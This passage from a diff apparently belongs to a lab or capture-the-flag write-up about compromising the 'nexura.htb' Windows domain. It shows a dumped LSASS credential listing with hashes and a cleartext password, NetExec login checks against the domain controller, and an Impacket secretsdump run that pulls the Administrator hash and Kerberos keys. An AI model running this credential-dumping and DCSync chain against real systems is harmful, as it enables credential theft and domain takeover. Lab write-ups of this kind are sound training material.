+		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
+	== WDIGEST [41308]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+
+== LogonSession ==
+authentication_id 69274 (10e9a)
+session_id 1
+username DWM-1
+domainname Window Manager
+logon_server 
+logon_time 2026-07-29T12:37:16.875109+00:00
+sid S-1-5-90-0-1
+luid 69274
+	== MSV ==
+		Username: JUMP01$
+		Domain: NEXURA
+		LM: NA
+		NT: 7bef0ee0b472d2c5805921324525f321
+		SHA1: 6158a1877c4157ed624eb5c4d717e237525bbef1
+		DPAPI: 0000000000000000000000000000000000000000
+--
+username stom
+domainname NEXURA
+logon_server DC01
+logon_time 2026-07-29T12:37:49.031359+00:00
+sid S-1-5-21-1333759777-277832620-2286231135-1106
+luid 223331
+	== MSV ==
+		Username: stom
+		Domain: NEXURA
+		LM: NA
+		NT: 21ea958524cfd9a7791737f8d2f764fa
+		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
+		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
+	== WDIGEST [36863]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: stom
+		Domain: NEXURA.HTB
+		Password: calves-warp-learning1
+		password (hex)630061006c007600650073002d0077006100720070002d006c006500610072006e0069006e0067003100000000000000
+		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
+		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
+	== WDIGEST [36863]==
+		username stom
+		domainname NEXURA
+		password None
+		password (hex)
+
+== LogonSession ==
+authentication_id 997 (3e5)
+session_id 0
+username LOCAL SERVICE
+domainname NT AUTHORITY
+logon_server 
+logon_time 2026-07-29T12:37:16.968850+00:00
+sid S-1-5-19
+luid 997
+	== Kerberos ==
+		Username: 
+		Domain: 
+
+== LogonSession ==
+authentication_id 999 (3e7)
+session_id 0
+
+nxc winrm 172.16.119.11 -u stom -p 'calves-warp-learning1'
+WINRM       172.16.119.11   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:nexura.htb) 
+WINRM       172.16.119.11   5985   DC01             [+] nexura.htb\stom:calves-warp-learning1 (Pwn3d!)
+
+nxc smb 172.16.119.11 -u stom -p 'calves-warp-learning1'
+SMB         172.16.119.11   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:nexura.htb) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         172.16.119.11   445    DC01             [+] nexura.htb\stom:calves-warp-learning1 (Pwn3d!)
+
+python3 secretsdump.py 'nexura.htb/stom:calves-warp-learning1@172.16.119.11' -just-dc-user Administrator
+Impacket v0.14.0.dev0+20260528.131215.b27827ae - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:cd6a08bd2809d10a4bd3d41bc0e3ed0e21c7559961edc58209d190aaf9cb02a8
+Administrator:aes128-cts-hmac-sha1-96:6743a42ac84aa2c5c1441aa64c03a3f0
+Administrator:des-cbc-md5:5ec10792619bfb6e
+[*] Cleaning up... 
+
+36e09e1e6ade94d63fbcab5e5b8d6d23
+```
